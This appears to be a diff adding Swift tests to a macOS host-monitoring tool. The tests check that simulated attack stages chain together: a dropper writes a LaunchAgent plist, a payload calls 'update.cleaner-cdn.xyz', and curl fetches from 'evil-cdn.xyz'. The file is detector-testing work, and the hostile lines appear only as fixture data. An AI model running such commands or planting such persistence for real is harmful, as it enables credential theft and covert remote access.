@@ -1,3 +1,4 @@
+import Foundation
 import Testing
 @testable import Hostwatch
 
@@ -193,5 +194,67 @@ import Testing
                     args: "security find-generic-password -s gh:github.com -w"))
         s.feed(net(gh, pid: 1200, to: "140.82.121.6:443", host: "api.github.com"))
         #expect(s.stories.openChains.allSatisfy { !$0.stages.contains(.credential) })
+    }
+
+    // MARK: Split-up attacks still chain (evidence links)
+
+    func chain(_ s: Scenario, has stages: Set<StoryStage>) -> Bool {
+        s.stories.openChains.contains { Set($0.stages).isSuperset(of: stages) }
+    }
+
+    @Test func loginItemStartingThePayloadLaterLinksBackToItsWriter() throws {
+        let s = Scenario()
+        let dropper = "\(home)/Downloads/Installer"
+        let payload = "\(home)/Library/Application Support/.updater/agent"
+        let plist = "\(home)/Library/LaunchAgents/com.updater.agent.plist"
+        let xml = try PropertyListSerialization.data(fromPropertyList: ["Label": "com.updater.agent",
+            "ProgramArguments": [payload, "--daemon"]], format: .xml, options: 0)
+        s.stories.readPlist = { $0 == plist ? xml : nil }
+        s.feed(exec(dropper, pid: 1300, ppid: 1, parent: "/sbin/launchd"))
+        s.feed(file(dropper, pid: 1300, "w", plist))
+        // Hours later (after a reboot): launchd starts the payload, which calls home.
+        s.feed(exec(payload, pid: 300, ppid: 1, parent: "/sbin/launchd"), after: 3 * 3600)
+        s.feed(net(payload, pid: 300, to: "45.33.12.7:8443", host: "update.cleaner-cdn.xyz"))
+        #expect(chain(s, has: [.persistence, .network]))
+    }
+
+    @Test func untrustedProgramActingTwiceMinutesApartChains() {
+        let s = Scenario()
+        let tool = "\(home)/Downloads/Tool.app/Contents/MacOS/Tool"
+        s.feed(exec(tool, pid: 1400, ppid: 1, parent: "/sbin/launchd"))
+        s.feed(file(tool, pid: 1400, "w", "\(home)/Library/LaunchAgents/com.tool.plist"))
+        s.feed(exec(tool, pid: 1410, ppid: 1, parent: "/sbin/launchd"), after: 20 * 60)   // run again
+        s.feed(net(tool, pid: 1410, to: "45.1.1.1:8443"))
+        #expect(chain(s, has: [.persistence, .network]))
+    }
+
+    @Test func trustedAppActingTwiceMinutesApartDoesNotChain() {
+        let s = Scenario()
+        s.feed(exec(slack, pid: 1500, ppid: 1, parent: "/sbin/launchd"))
+        s.feed(file(slack, pid: 1500, "w", "\(home)/Library/LaunchAgents/com.tinyspeck.slack.plist"))
+        s.feed(net(slack, pid: 1500, to: "45.1.1.1:8443"), after: 20 * 60)
+        #expect(!chain(s, has: [.persistence, .network]))
+    }
+
+    @Test func twoProgramsReachingTheSameNewDomainChain() throws {
+        let s = Scenario()
+        let agent = "\(home)/.cache/x/agent"
+        s.feed(exec(iterm, pid: 600, ppid: 1, parent: "/sbin/launchd"))
+        s.feed(exec("/usr/bin/login", pid: 610, ppid: 600, parent: iterm))
+        s.feed(exec(fish, pid: 620, ppid: 610, parent: "/usr/bin/login"))
+        s.feed(exec("/usr/bin/curl", pid: 630, ppid: 620, parent: fish, args: "curl -O https://evil-cdn.xyz/a"))
+        s.feed(net("/usr/bin/curl", pid: 630, to: "45.33.12.7:443", host: "evil-cdn.xyz"))
+        s.feed(exec(agent, pid: 700, ppid: 1, parent: "/sbin/launchd"), after: 5 * 60)
+        s.feed(net(agent, pid: 700, to: "45.33.12.8:443", host: "evil-cdn.xyz"))
+        let story = try #require(s.stories.openChains.first { $0.stages.contains(.newDomain) })
+        #expect(Set(story.steps.map(\.pid)).isSuperset(of: [630, 700]))
+    }
+
+    @Test func twoProgramsReachingAKnownDomainDoNotChain() {
+        let s = Scenario(learningMinutes: 1)
+        s.feed(net("/usr/bin/curl", pid: 800, to: "140.82.121.6:443", host: "api.github.com"))   // learned
+        s.feed(net("/usr/bin/curl", pid: 810, to: "140.82.121.6:443", host: "api.github.com"), after: 120)
+        s.feed(net("/opt/homebrew/bin/gh", pid: 820, to: "140.82.121.6:443", host: "api.github.com"))
+        #expect(s.stories.openChains.allSatisfy { Set($0.steps.map(\.pid)).count <= 1 })
     }
 }
